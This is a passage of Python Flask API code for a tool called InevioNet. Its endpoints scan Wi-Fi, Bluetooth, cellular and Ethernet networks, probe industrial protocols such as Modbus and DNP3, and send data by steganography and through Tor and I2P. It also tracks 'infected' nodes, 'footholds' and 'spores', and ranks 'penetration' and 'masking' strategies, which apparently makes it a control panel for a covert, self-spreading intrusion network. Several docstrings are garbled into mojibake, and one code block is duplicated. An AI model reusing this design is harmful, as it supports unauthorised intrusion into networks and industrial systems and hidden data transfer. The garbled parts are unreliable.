    d = request.json or {}
    try:
        r = get_net().probe_node(d.get('target', 'example.com'))
        return jsonify(r if isinstance(r, dict) else {'successful': 1, 'total': 1})
    except Exception as e:
        return jsonify({'successful': 0, 'total': 1, 'error': str(e)})


@app.route('/api/rf/scan', methods=['POST'])
def api_rf_scan():
    wifi = scan_wifi()
    bt = scan_bt()
    for sig in wifi:
        upsert({
            'node_id': 'wifi_' + sig['bssid'].replace(':', '').replace('-', '').lower(),  # P29
            'name': sig['ssid'],
            'label': sig['ssid'],
            'type': 'wifi',
            'ip': 'unknown',
            'port': 0,
            'trust': max(10, min(100, 50 + sig['signal'] / 2.0)),
            'packets': 0,
            'online': True,
            'rssi': sig['rssi_dbm'],
            'signal': sig['signal'],
            'method': 'rf_scan',
            'evolving': False,
            'parent': get_net().node_id,
        })
    for d in bt:
        upsert({
            'node_id': 'bt_' + d['id'],
            'name': d['name'],
            'label': d['name'],
            'type': 'bluetooth',
            'ip': 'unknown',
            'port': 0,
            'trust': 40.0,
            'packets': 0,
            'online': True,
            'rssi': -70,
            'signal': 50,
            'method': 'rf_scan',
            'evolving': False,
            'parent': get_net().node_id,
        })
    return jsonify({'success': True, 'wifi': len(wifi), 'bt': len(bt)})


@app.route('/api/ethernet/scan', methods=['POST'])
def api_ethernet_scan():
    """P36: scan Ethernet subnet for industrial protocols."""
    d = request.get_json(silent=True) or {}
    subnet = d.get('subnet')
    try:
        from inevionet.network.ethernet_scanner import scan_ethernet_subnet
        results = scan_ethernet_subnet(subnet=subnet)
        for host in results:
            ip = host['ip']
            for svc in host['services']:
                nid = 'ind_%s_%s' % (svc['protocol'], ip.replace('.', '_'))
                upsert({
                    'node_id': nid,
                    'name': '%s @ %s' % (svc['protocol'].upper(), ip),
                    'label': '%s:%s' % (svc['protocol'], ip),
                    'type': 'industrial',
                    'ip': ip,
                    'port': svc['port'],
                    'trust': 70.0, 'packets': 0, 'online': True,
                    'rssi': -30, 'signal': 100,
                    'method': 'ethernet_scan',
                    'evolving': False,
                    'parent': get_net().node_id,
                })
        return jsonify({'success': True, 'hosts': results, 'count': len(results)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/ethernet/interfaces')
def api_ethernet_interfaces():
    """P36: list Ethernet interfaces."""
    try:
        from inevionet.network.ethernet_scanner import get_ethernet_interfaces
        return jsonify({'success': True, 'interfaces': get_ethernet_interfaces()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/rf/signals')
def api_rf_signals():
    nodes = snapshot()
    wifi = [v for v in nodes.values() if v.get('type') == 'wifi']
    bt = [v for v in nodes.values() if v.get('type') == 'bluetooth']
    return jsonify({'success': True, 'wifi': wifi, 'bt': bt})


# ================================================================
# P31: pywifi endpoints (add to netsh, not replace)
# ================================================================
@app.route('/api/wifi/pywifi/scan', methods=['POST'])
def api_wifi_pywifi_scan():
    """P31: scan via pywifi (RSSI dBm + auth)."""
    try:
        sigs = scan_wifi_pywifi(wait_sec=4.0)
        for sig in sigs:
            nid = 'wifi_' + sig['bssid'].replace(':', '').replace('-', '').lower()
            upsert({
                'node_id': nid,
                'name': sig['ssid'],
                'label': sig['ssid'],
                'type': 'wifi',
                'ip': 'unknown', 'port': 0,
                'trust': max(10, min(100, 50 + sig['signal'] / 2.0)),
                'packets': 0, 'online': True,
                'rssi': sig['rssi_dbm'],
                'signal': sig['signal'],
                'method': 'pywifi_scan',
                'evolving': False,
                'parent': get_net().node_id,
                'auth': sig.get('auth', ''),
            })
        return jsonify({'success': True, 'count': len(sigs), 'signals': sigs, 'source': 'pywifi'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wifi/combined/scan', methods=['POST'])
def api_wifi_combined_scan():
    """P31: pywifi + netsh combined scan."""
    try:
        sigs = scan_wifi_combined()
        return jsonify({
            'success': True,
            'count': len(sigs),
            'signals': sigs,
            'by_source': {
                'pywifi': len([s for s in sigs if s.get('source') == 'pywifi']),
                'netsh': len([s for s in sigs if s.get('source') == 'netsh']),
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wifi/pywifi/status')
def api_wifi_pywifi_status():
    """P31: pywifi interface status."""
    try:
        from pywifi import const
        iface = _get_pywifi_iface()
        if iface is None:
            return jsonify({'success': False, 'error': 'no_interface'})
        status_map = {
            const.IFACE_DISCONNECTED: 'disconnected',
            const.IFACE_SCANNING: 'scanning',
            const.IFACE_INACTIVE: 'inactive',
            const.IFACE_CONNECTING: 'connecting',
            const.IFACE_CONNECTED: 'connected',
        }
        st = iface.status()
        return jsonify({
            'success': True,
            'name': iface.name(),
            'status': status_map.get(st, str(st)),
            'available': True,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wifi/pywifi/connect', methods=['POST'])
def api_wifi_pywifi_connect():
    """P31: connect to WiFi via pywifi."""
    d = request.json or {}
    ssid = (d.get('ssid') or '').strip()
    password = d.get('password', '')
    if not ssid:
        return jsonify({'success': False, 'error': 'no_ssid'}), 400
    try:
        import pywifi
        from pywifi import const
        import time as _t

        iface = _get_pywifi_iface()
        if iface is None:
            return jsonify({'success': False, 'error': 'no_interface'}), 500

        # P32: disconnect + wait
        try:
            iface.disconnect()
        except Exception:
            pass
        _t.sleep(1.5)

        # Build profile
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN

        if password:
            # Try WPA2-PSK first
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

        iface.remove_all_network_profiles()
        tmp = iface.add_network_profile(profile)
        iface.connect(tmp)
        _t.sleep(5)

        connected = (iface.status() == const.IFACE_CONNECTED)
        log.info('[pywifi] connect %s: %s', ssid, 'OK' if connected else 'FAIL')
        return jsonify({
            'success': connected,
            'ssid': ssid,
            'status': 'connected' if connected else 'failed',
        })
    except Exception as e:
        log.error('[pywifi] connect error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wifi/pywifi/disconnect', methods=['POST'])
def api_wifi_pywifi_disconnect():
    """P31: disconnect WiFi via pywifi."""
    try:
        from pywifi import const
        iface = _get_pywifi_iface()
        if iface is None:
            return jsonify({'success': False, 'error': 'no_interface'}), 500
        iface.disconnect()
        return jsonify({'success': True, 'status': 'disconnected'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ================================================================
# P13: INDUSTRIAL / STEGO / EVOLUTION endpoints
# ================================================================
@app.route('/api/industrial/scan', methods=['POST'])
def api_industrial_scan():
    """P13: РЎРѓР С”Р В°Р Р…Р С‘РЎР‚Р С•Р Р†Р В°Р Р…Р С‘Р Вµ Р С—РЎР‚Р С•Р СРЎвЂ№РЎв‚¬Р В»Р ВµР Р…Р Р…РЎвЂ№РЎвЂ¦ Р С—РЎР‚Р С•РЎвЂљР С•Р С”Р С•Р В»Р С•Р Р†."""
    d = request.json or {}
    target = (d.get('target') or '').strip()
    if not target:
        return jsonify({'success': False, 'error': 'no_target'}), 400
    try:
        n = get_net()
        results = n.scan_industrial(target)
        for proto, res in results.items():
            if res.get('found'):
                nid = 'ind_%s_%s' % (proto, target.replace(':', '_'))
                upsert({
                    'node_id': nid,
                    'name': '%s @ %s' % (proto.upper(), target),
                    'label': '%s:%s' % (proto, target),
                    'type': 'industrial',
                    'ip': target.split(':')[0],
                    'port': {'modbus': 502, 'mqtt': 1883,
                             'opcua': 4840, 'dnp3': 20000}.get(proto, 0),
                    'trust': 70.0, 'packets': 0, 'online': True,
                    'rssi': -50, 'signal': 80,
                    'method': 'industrial_scan',
                    'evolving': False, 'parent': n.node_id,
                })
        return jsonify({'success': True, 'target': target, 'results': results})
    except Exception as e:
        log.error('[Industrial] scan error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/industrial/mqtt/publish', methods=['POST'])
def api_industrial_mqtt_publish():
    d = request.json or {}
    host = (d.get('host') or '').strip()
    topic = d.get('topic', 'inevionet/test')
    message = d.get('message', '')
    if not host or not message:
        return jsonify({'success': False, 'error': 'empty'}), 400
    try:
        n = get_net()
        result = n.transport.send_via_mqtt(
            data=message.encode('utf-8'), host=host,
            port=int(d.get('port', 1883)), topic=topic,
            qos=int(d.get('qos', 0)))
        return jsonify({
            'success': result.success,
            'bytes_sent': result.bytes_sent,
            'error': result.error,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/stego/send', methods=['POST'])
def api_stego_send():
    """P13: Р С•РЎвЂљР С—РЎР‚Р В°Р Р†Р С”Р В° РЎвЂЎР ВµРЎР‚Р ВµР В· РЎРѓРЎвЂљР ВµР С–Р В°Р Р…Р С•Р С–РЎР‚Р В°РЎвЂћР С‘РЎР‹."""
    d = request.json or {}
    target = d.get('target', 'httpbin.org')
    method = d.get('method', 'HTTP_HEADERS')
    data_str = d.get('data', 'test message')
    try:
        n = get_net()
        data = data_str.encode('utf-8')
        result = n.stealth.send(data, method=method, target=target)
        if hasattr(n, 'evolution') and n.evolution:
            n.evolution.reward('stego', method, result.success)
        return jsonify({
            'success': result.success,
            'method': result.method,
            'bytes_sent': result.bytes_sent,
            'overhead': result.overhead,
            'duration_ms': result.duration_ms,
            'error': result.error,
        })
    except Exception as e:
        log.error('[Stego] send error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/evolution/catastrophe', methods=['POST'])
def api_evolution_catastrophe():
    """P13: РЎвЂћР С•РЎР‚РЎРѓР С‘РЎР‚Р С•Р Р†Р В°РЎвЂљРЎРЉ Р С”Р В°РЎвЂљР В°РЎРѓРЎвЂљРЎР‚Р С•РЎвЂћРЎС“."""
    try:
        n = get_net()
        if not n.evolution:
            return jsonify({'success': False, 'error': 'no_evolution'}), 400
        before = n.evolution.get_stats()
        n.evolution._catastrophe()
        after = n.evolution.get_stats()
        return jsonify({
            'success': True,
            'generation': n.evolution.generation,
            'before': before, 'after': after,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/evolution/best_strategies')
def api_evolution_best_strategies():
    """P13: Р В»РЎС“РЎвЂЎРЎв‚¬Р С‘Р Вµ РЎРѓРЎвЂљРЎР‚Р В°РЎвЂљР ВµР С–Р С‘Р С‘ Р С—Р С• РЎвЂљР С‘Р С—Р В°Р С."""
    try:
        n = get_net()
        if not n.evolution:
            return jsonify({'success': False, 'error': 'no_evolution'})
        return jsonify({
            'success': True,
            'generation': n.evolution.generation,
            'best': {
                'penetration': n.evolution.best_strategy('penetration'),
                'masking': n.evolution.best_strategy('masking'),
                'stego': n.evolution.best_strategy('stego'),
                'industrial': n.evolution.best_strategy('industrial'),
                'protocol': n.evolution.best_strategy('protocol'),
            },
            'stats': n.evolution.get_stats(),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/masking/stats')
def api_masking_stats_full():
    """P13: РЎРѓРЎвЂљР В°РЎвЂљР С‘РЎРѓРЎвЂљР С‘Р С”Р В° Р СР В°РЎРѓР С”Р С‘РЎР‚Р С•Р Р†Р С”Р С‘."""
    try:
        n = get_net()
        return jsonify({'success': True, 'stats': n.get_masking_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tor/status')
def api_tor_status():
    """P13: Tor availability."""
    try:
        from inevionet.network.tor_transport import TorTransport
        t = TorTransport()
        return jsonify({'success': True, 'available': t.is_available()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/tor/send', methods=['POST'])
def api_tor_send():
    """P13: Send via Tor."""
    d = request.json or {}
    host = d.get('host', 'check.torproject.org')
    port = int(d.get('port', 80))
    data = d.get('data', 'GET / HTTP/1.0\r\n\r\n')
    try:
        from inevionet.network.tor_transport import TorTransport
        t = TorTransport()
        if not t.is_available():
            return jsonify({'success': False, 'error': 'tor_unavailable'}), 503
        ok, resp = t.send(data.encode('utf-8'), host, port)
        return jsonify({
            'success': ok,
            'response_len': len(resp) if resp else 0,
            'via': 'tor',
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/ble/scan', methods=['POST'])
def api_ble_scan():
    """P13: BLE scan."""
    d = request.json or {}
    duration = float(d.get('duration', 5.0))
    try:
        from inevionet.network.ble_scanner import scan_ble
        devices = scan_ble(duration=duration)
        for dev in devices:
            nid = 'ble_' + dev.get('mac', 'unknown')
            upsert({
                'node_id': nid,
                'name': dev.get('name', 'BLE'),
                'label': dev.get('name', 'BLE')[:20],
                'type': 'ble',
                'ip': 'unknown', 'port': 0,
                'trust': 50.0, 'packets': 0, 'online': True,
                'rssi': dev.get('rssi', -70), 'signal': 50,
                'method': 'ble_scan', 'evolving': False,
                'parent': None,
            })
        return jsonify({'success': True, 'devices': devices, 'count': len(devices)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/lte/scan', methods=['POST'])
def api_lte_scan():
    """P13: LTE/5G scan."""
    try:
        from inevionet.network.lte_scanner import scan_lte
        cells = scan_lte()
        for cell in cells:
            nid = 'cell_' + (cell.get('operator', 'unknown')[:16])
            upsert({
                'node_id': nid,
                'name': cell.get('operator', 'Cell'),
                'label': cell.get('tech', 'LTE'),
                'type': 'cellular',
                'ip': 'unknown', 'port': 0,
                'trust': 60.0, 'packets': 0, 'online': True,
                'rssi': -85, 'signal': 40,
                'method': 'lte_scan', 'evolving': False,
                'parent': None,
            })
        return jsonify({'success': True, 'cells': cells, 'count': len(cells)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ================================================================
# SOCKETIO
# ================================================================
@app.route('/api/i2p/status')
def api_i2p_status():
    try:
        from inevionet.network.i2p_transport import I2PTransport
        t = I2PTransport()
        return jsonify({'success': True, 'available': t.is_available()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/i2p/send', methods=['POST'])
def api_i2p_send():
    d = request.json or {}
    host = d.get('host', 'i2p-projekt.i2p')
    port = int(d.get('port', 80))
    data = d.get('data', 'GET / HTTP/1.0\r\n\r\n')
    try:
        from inevionet.network.i2p_transport import I2PTransport
        t = I2PTransport()
        if not t.is_available():
            return jsonify({'success': False, 'error': 'i2p_unavailable'}), 503
        ok, resp = t.send(data.encode('utf-8'), host, port)
        return jsonify({'success': ok, 'response_len': len(resp) if resp else 0, 'via': 'i2p'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

_bridge_broker = None
_bridge_relay = None
_bridge_lock = __import__('threading').Lock()


def _get_bridge_broker():
    global _bridge_broker
    with _bridge_lock:
        if _bridge_broker is None:
            from inevionet.network.bridge_broker import BridgeBroker
            _bridge_broker = BridgeBroker()
        return _bridge_broker


@app.route('/api/bridge/status')
def api_bridge_status():
    try:
        broker = _get_bridge_broker()
        return jsonify({
            'success': True,
            'broker': broker.get_stats(),
            'relays': broker.get_relays(),
            'is_volunteer': _bridge_relay is not None,
            'relay': _bridge_relay.get_stats() if _bridge_relay else None,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/bridge/volunteer', methods=['POST'])
def api_bridge_volunteer():
    global _bridge_relay
    d = request.json or {}
    capacity = int(d.get('capacity', 10))
    region = d.get('region', 'unknown')
    try:
        from inevionet.network.relay_node import RelayNode
        broker = _get_bridge_broker()
        n = get_net()
        with _bridge_lock:
            if _bridge_relay is not None:
                _bridge_relay.stop()
            _bridge_relay = RelayNode(node_id=n.node_id, broker=broker,
                                       capacity=capacity, region=region)
            _bridge_relay.start()
        return jsonify({'success': True, 'relay': _bridge_relay.get_stats(),
                        'broker': broker.get_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/bridge/stop', methods=['POST'])
def api_bridge_stop():
    global _bridge_relay
    try:
        with _bridge_lock:
            if _bridge_relay is not None:
                _bridge_relay.stop()
                _bridge_relay = None
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/bridge/request', methods=['POST'])
def api_bridge_request():
    d = request.json or {}
    try:
        broker = _get_bridge_broker()
        relay = broker.pick_relay(region=d.get('region'))
        if relay:
            return jsonify({'success': True, 'relay': relay.to_dict()})
        return jsonify({'success': False, 'error': 'no_relay_available'}), 503
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/export/state.json')
def api_export_state_json():
    try:
        from flask import Response
        import json as _json
        n = get_net()
        state = {
            'node_id': n.node_id,
            'timestamp': time.time(),
            'nodes': snapshot(),
            'infected': len(get_footholds()),
            'stats': n.get_stats(),
        }
        return Response(
            _json.dumps(state, ensure_ascii=False, indent=2),
            mimetype='application/json',
            headers={'Content-Disposition': 'attachment; filename=inevionet_state.json'},
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/cellular/scan', methods=['POST'])
def api_cellular_scan():
    """P13: Full cellular scan."""
    try:
        from inevionet.network.cellular_scanner import full_cellular_scan
        result = full_cellular_scan()
        # Add nodes for found operators
        for op in result.get('via_wifi', []):
            nid = 'cell_' + op.get('operator', 'unknown').lower()
            upsert({
                'node_id': nid,
                'name': op.get('operator', 'Cell'),
                'label': op.get('operator', 'Cell')[:20],
                'type': 'cellular',
                'ip': 'unknown', 'port': 0,
                'trust': 60.0, 'packets': 0, 'online': True,
                'rssi': -85, 'signal': 40,
                'method': 'cellular_via_wifi', 'evolving': False,
                'parent': None,
            })
        for cell in result.get('modem', []):
            nid = 'cell_modem_' + str(cell.get('cell_id', 'unknown'))[:16]
            upsert({
                'node_id': nid,
                'name': cell.get('operator', 'Cell') + ' (' + cell.get('tech', '?') + ')',
                'label': cell.get('operator', 'Cell')[:20],
                'type': 'cellular',
                'ip': 'unknown', 'port': 0,
                'trust': 70.0, 'packets': 0, 'online': True,
                'rssi': -75, 'signal': 60,
                'method': 'modem', 'evolving': False,
                'parent': None,
            })
        return jsonify({'success': True, **result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/cellular/locate')
def api_cellular_locate():
    """P13: Geolocate via WiFi."""
    try:
        from inevionet.network.cellular_scanner import geolocate_via_wifi
        loc = geolocate_via_wifi()
        return jsonify({'success': bool(loc), 'location': loc})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/cellular/operator')
def api_cellular_operator():
    """P13: Guess operator from WiFi."""
    try:
        from inevionet.network.cellular_scanner import scan_cellular_via_wifi
        ops = scan_cellular_via_wifi()
        return jsonify({'success': True, 'operators': ops})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/relay/incoming', methods=['POST'])
def api_relay_incoming():
    """P13: receive relay packet and forward."""
    try:
        data = request.get_data()
        if not data:
            return jsonify({'success': False, 'error': 'empty'}), 400
        n = get_net()
        ok, result = n.receive(data)
        return jsonify({'success': bool(ok), 'packet_id': None})
    except Exception as e:
        log.error('[Relay] incoming error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/relay/transit', methods=['POST'])
def api_relay_transit():
    """P63d: register transit pheromone from relay."""
    try:
        d = request.get_json(silent=True) or {}
        source = d.get('source', '') or ''
        destination = d.get('destination', '') or ''
        via = d.get('via', '') or ''
        path = d.get('path', []) or []
        if not source or not destination:
            return jsonify({'success': False, 'error': 'missing'}), 400
        n = get_net()
        try:
            n.mycelium.pheromones.mark_transit(
                source=source, destination=destination,
                via=via, path=path)
        except Exception as _e:
            log.debug('[Transit] mark: %s', _e)
        return jsonify({'success': True})
    except Exception as e:
        log.error('[Transit] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/bootstrap/seed', methods=['GET', 'POST'])
def api_bootstrap_seed():
    """P70g: создать/опубликовать Seed."""
    try:
        from inevionet.bootstrap import Seed, SeedPublisher
        n = get_net()
        public_addr = getattr(n, "public_addr", None)
        if not public_addr:
            return jsonify({'success': False, 'error': 'no_public_addr'})
        seed = Seed(
            node_id=n.node_id,
            public_ip=public_addr[0],
            public_port=public_addr[1],
            nat_type=getattr(n, "nat_type", "unknown"),
            ttl_sec=3600,
        )
        seed.sign()
        if request.method == 'POST':
            pub = SeedPublisher()
            url = pub.publish(seed)
            if url:
                return jsonify({'success': True, 'url': url,
                                'seed': seed.to_dict(), 'text': seed.to_text()})
            return jsonify({'success': False, 'error': 'publish_failed',
                            'seed': seed.to_dict(), 'text': seed.to_text()})
        return jsonify({'success': True, 'seed': seed.to_dict(),
                        'text': seed.to_text()})
    except Exception as e:
        log.error('[Bootstrap] seed error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/bootstrap/sprout', methods=['POST'])
def api_bootstrap_sprout():
    """P70g: прорастить Seed из URL или текста."""
    try:
        from inevionet.bootstrap import Seed
        d = request.get_json(silent=True) or {}
        n = get_net()
        if not getattr(n, "sprout", None):
            return jsonify({'success': False, 'error': 'no_sprout'})
        url = d.get('url', '')
        text = d.get('text', '')
        texts = d.get('texts', [])  # P75: список
        urls = d.get('urls', [])     # P75fix: список URL
        if urls:
            cnt = n.sprout.add_urls_multi(urls)
            return jsonify({'success': True, 'action': 'queued_urls',
                            'count': cnt})
        if texts:
            cnt = n.sprout.add_urls_multi(texts)
            return jsonify({'success': True, 'action': 'queued_urls',
                            'count': cnt})
        if url:
            if url.startswith("http") and ("\n" in url or " " in url):
                cnt = n.sprout.add_urls_multi(url)
                return jsonify({'success': True, 'action': 'queued_urls',
                                'count': cnt})
            n.sprout.add_url(url)
            return jsonify({'success': True, 'action': 'queued_url'})
        if text:
            seed = Seed.from_text(text)
            if not seed:
                return jsonify({'success': False, 'error': 'bad_text'})
            ok = n.sprout.add_seed(seed)
            return jsonify({'success': bool(ok), 'sprouted': ok,
                            'node_id': seed.node_id})
        return jsonify({'success': False, 'error': 'need_url_or_text'}), 400
    except Exception as e:
        log.error('[Bootstrap] sprout error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/gravity/field')
def api_gravity_field():
    """P70g: показать поле притяжения."""
    try:
        n = get_net()
        if not getattr(n, "gravity", None):
            return jsonify({'success': False, 'error': 'no_gravity'})
        return jsonify({'success': True, 'field': n.gravity.get_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/punch', methods=['POST'])
def api_network_punch():
    """P71: запустить UDP hole punching к peer."""
    try:
        n = get_net()
        d = request.get_json(silent=True) or {}
        peer_node = d.get('peer', '')
        peer_host = d.get('host', '')
        peer_port = int(d.get('port', 0))

        if not peer_host or not peer_port:
            # Попробовать найти в trusted_hosts по node_id
            if peer_node:
                for h in n.trusted_hosts.list_all():
                    if h.get('label') == peer_node:
                        host_str = h.get('host', '')
                        if ':' in host_str:
                            peer_host, port_s = host_str.rsplit(':', 1)
                            peer_port = int(port_s)
                        else:
                            peer_host = host_str
                            peer_port = 0
                        break

        if not peer_host or not peer_port:
            return jsonify({'success': False, 'error': 'no_peer_addr'})

        from inevionet.network.udp import UDPHolePuncher
        p = UDPHolePuncher()
        addr = p.discover_public()
        result = p.punch_bidirectional(
            (peer_host, peer_port), attempts=20, interval=0.25)
        p.close()

        if result:
            try:
                n.gravity.add_mass(peer_node or peer_host, 1.0)
            except Exception:
                pass
            return jsonify({'success': True, 'punched': True,
                            'peer': peer_node or peer_host,
                            'public_addr': list(addr or [])})
        return jsonify({'success': True, 'punched': False,
                        'peer': peer_node or peer_host,
                        'public_addr': list(addr or [])})
    except Exception as e:
        log.error('[Punch] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/bootstrap/status')
def api_bootstrap_status():
    """P70g: статус bootstrap."""
    try:
        n = get_net()
        sprout_stats = {}
        if getattr(n, "sprout", None):
            sprout_stats = n.sprout.get_stats()
        gravity_stats = {}
        if getattr(n, "gravity", None):
            gravity_stats = n.gravity.get_stats()
        return jsonify({
            'success': True,
            'sprout': sprout_stats,
            'gravity': gravity_stats,
            'public_addr': list(getattr(n, "public_addr", None) or []),
            'nat_type': getattr(n, "nat_type", "unknown"),
            'node_id': n.node_id,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/punch/status')
def api_network_punch_status():
    """P71: статистика punch."""
    try:
        n = get_net()
        gravity_stats = {}
        if getattr(n, "gravity", None):
            gravity_stats = n.gravity.get_stats()
        return jsonify({
            'success': True,
            'gravity': gravity_stats,
            'public_addr': list(getattr(n, "public_addr", None) or []),
            'nat_type': getattr(n, "nat_type", "unknown"),
            'relay_port': int(os.environ.get('INEVIO_RELAY_PORT', 0)),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/audit/log')
def api_audit_log():
    """P77: последние события audit-цепочки."""
    try:
        n = get_net()
        if not getattr(n, "audit", None):
            return jsonify({'success': False, 'error': 'no_audit'})
        limit = int(request.args.get('limit', 20))
        ev_type = request.args.get('type', None)
        if ev_type:
            events = n.audit.get_by_type(ev_type, limit=limit)
        else:
            events = n.audit.get_recent(limit)
        return jsonify({
            'success': True,
            'events': events,
            'stats': n.audit.get_stats(),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/audit/verify')
def api_audit_verify():
    """P77: проверка целостности audit-цепочки."""
    try:
        n = get_net()
        if not getattr(n, "audit", None):
            return jsonify({'success': False, 'error': 'no_audit'})
        return jsonify({'success': True, **n.audit.verify()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/audit/add', methods=['POST'])
def api_audit_add():
    """P77: добавить событие вручную."""
    try:
        n = get_net()
        if not getattr(n, "audit", None):
            return jsonify({'success': False, 'error': 'no_audit'})
        d = request.get_json(silent=True) or {}
        ev = n.audit.add_event(
            d.get('type', 'manual'),
            d.get('data', {}))
        return jsonify({'success': True, 'hash': ev.hash[:16],
                        'timestamp': ev.timestamp})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/ai/contextual')
def api_ai_contextual():
    """P78: статистика ContextualSelector."""
    try:
        n = get_net()
        sel = getattr(n, "contextual_selector", None)
        if sel is None:
            return jsonify({'success': True, 'contextual': {},
                            'message': 'not_initialized'})
        return jsonify({'success': True, 'contextual': sel.get_stats()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/ai/contextual/reset', methods=['POST'])
def api_ai_contextual_reset():
    """P78: сброс ContextualSelector."""
    try:
        n = get_net()
        sel = getattr(n, "contextual_selector", None)
        if sel is not None:
            sel.reset()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/local')
def api_network_local():
    """P82: карта своей подсети."""
    try:
        n = get_net()
        if not getattr(n, "local_map", None):
            return jsonify({'success': False, 'error': 'no_local_map'})
        force = request.args.get('force', '0') == '1'
        if force or not n.local_map.devices:
            m = n.local_map.build()
        else:
            m = n.local_map.get_map()
        return jsonify({'success': True, **m})
    except Exception as e:
        log.error('[LocalMap] error: %s', e)
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/network/tree')
def api_network_tree():
    """P82/P87fix: дерево сетей (из кэша фон-скана)."""
    try:
        n = get_net()
        if not getattr(n, "network_tree", None):
            return jsonify({'success': False, 'error': 'no_tree'})

        force = request.args.get('force', '0') == '1'
        refresh = request.args.get('refresh', '0') == '1'

        # Форс: запустить полный скан синхронно
        if force or refresh or not n.network_tree.root:
            local = {}
            if getattr(n, "local_map", None):
                local = n.local_map.build()
            topo = {}
            if getattr(n, "_auto_topology", None):
                try:
                    topo = n._auto_topology.export_map()
                except Exception:
                    pass
            # P88: spores
            spores_list = []
            try:
                if getattr(n, "mycelium", None) and getattr(n.mycelium, "spores", None):
                    sm = n.mycelium.spores
                    if hasattr(sm, "spores") and isinstance(sm.spores, dict):
                        for spore_id, spore in sm.spores.items():
                            try:
                                spores_list.append({
                                    "node_id": spore_id,
                                    "label": getattr(spore, "target_network", "") or getattr(spore, "label", ""),
                                    "parent": "wifi_" + spore_id.split("_")[-1] if "_" in spore_id else "",
                                    "ip": "mycelium",
                                    "rssi": -70,
                                    "trust": 65.0,
                                    "method": getattr(spore, "method", ""),
                                })
                            except Exception:
                                pass
            except Exception:
                pass
            n.network_tree.build(local_map=local, topology_map=topo, spores=spores_list)
            # P90a: WiFi-устройства
            try:
                added = n.network_tree.add_wifi_devices(local)
                if added:
                    log.info('[P90a] added %d wifi devices', added)
            except Exception as _we:
                log.debug('[P90a] %s', _we)
            # P88-fix3: footholds из web_state
            try:
                import json as _json
                from pathlib import Path as _Path
                state_paths = [
                    _Path(_data_home) / "web_state_%s.json" % _PORT,
                    _Path(_data_home) / "web_state.json",
                    _Path("E:/InevioNet/data/web_state.json"),
                ]
                for sp in state_paths:
                    if sp.exists():
                        with open(str(sp), "r", encoding="utf-8") as _f:
                            _st = _json.load(_f)
                        _footholds = _st.get("footholds", {})
                        if _footholds:
                            n.network_tree.add_footholds(_footholds)
                            log.info('[P88fix3] footholds: %d spores', len(_footholds))
                        break
            except Exception as _fe:
                log.debug('[P88fix3] footholds: %s', _fe)
            # P88-fix3: footholds из web_state
            try:
                import json as _json
                from pathlib import Path as _Path
                state_paths = [
                    _Path(_data_home) / "web_state_%s.json" % _PORT,
                    _Path(_data_home) / "web_state.json",
                    _Path("E:/InevioNet/data/web_state.json"),
                ]
                for sp in state_paths:
                    if sp.exists():
                        with open(str(sp), "r", encoding="utf-8") as _f:
                            _st = _json.load(_f)
                        _footholds = _st.get("footholds", {})
                        if _footholds:
                            n.network_tree.add_footholds(_footholds)
